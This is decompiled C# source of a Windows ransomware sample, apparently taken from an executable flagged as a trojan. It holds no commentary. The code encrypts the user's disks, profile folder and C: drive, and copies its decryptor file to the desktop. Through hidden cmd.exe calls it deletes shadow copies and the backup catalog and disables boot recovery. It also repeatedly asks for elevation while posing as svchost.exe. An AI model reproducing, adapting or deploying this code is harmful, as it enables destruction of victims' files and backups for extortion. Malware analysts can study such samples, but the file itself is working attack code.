// Decompiled with JetBrains decompiler
// Type: TimeTime.Program
// Assembly: TimeTime, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DE1A7A40-2404-4F4F-A36B-53821EC7A8B6
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-5ee8500fe1a2f22029908d4e2b32e7fb85aec03ffea714f3b5e82ebb2bc10f21.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace TimeTime
{
  internal static class Program
  {
    private static void DoStuff()
    {
      try
      {
        File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + Settings.decryptor_file_name);
        Cryptor.EncryptDisks();
        Cryptor.TryEncryptFolder(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
        Cryptor.EncryptFolder("C:\\");
      }
      catch (Exception ex)
      {
      }
    }

    private static void runCommand(string commands)
    {
      Process process = new Process();
      process.StartInfo = new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        Arguments = "/C " + commands,
        WindowStyle = ProcessWindowStyle.Hidden
      };
      process.Start();
      process.WaitForExit();
    }

    private static void RunItself(string args) => new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = Application.ExecutablePath,
        Arguments = args,
        WindowStyle = ProcessWindowStyle.Hidden
      }
    }.Start();

    [STAThread]
    private static void Main()
    {
      string[] commandLineArgs = Environment.GetCommandLineArgs();
      if (commandLineArgs.Length > 1)
      {
        if (commandLineArgs[1] == "/x")
        {
          Program.RunItself("/x1");
          Program.RunItself("/x2");
          Program.RunItself("/x3");
        }
        if (commandLineArgs[1] == "/x1")
          Program.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
        if (commandLineArgs[1] == "/x1")
          Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
        if (commandLineArgs[1] == "/x1")
          Program.runCommand("wbadmin delete catalog -quiet");
        if (commandLineArgs[1] == "/c")
        {
          Utils.uac_loop("svchost.exe");
          Environment.Exit(0);
        }
        Environment.Exit(0);
      }
      Program.RunItself("/c");
      FileManager.Init();
      foreach (string file in FileManager.GetFiles())
        Cryptor.encr_files.Add(file);
      try
      {
        new Thread(new ThreadStart(Program.DoStuff)).Start();
      }
      catch (Exception ex)
      {
        Program.DoStuff();
      }
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      Thread.Sleep(15000);
      Application.Run((Form) new Form1());
    }
  }
}
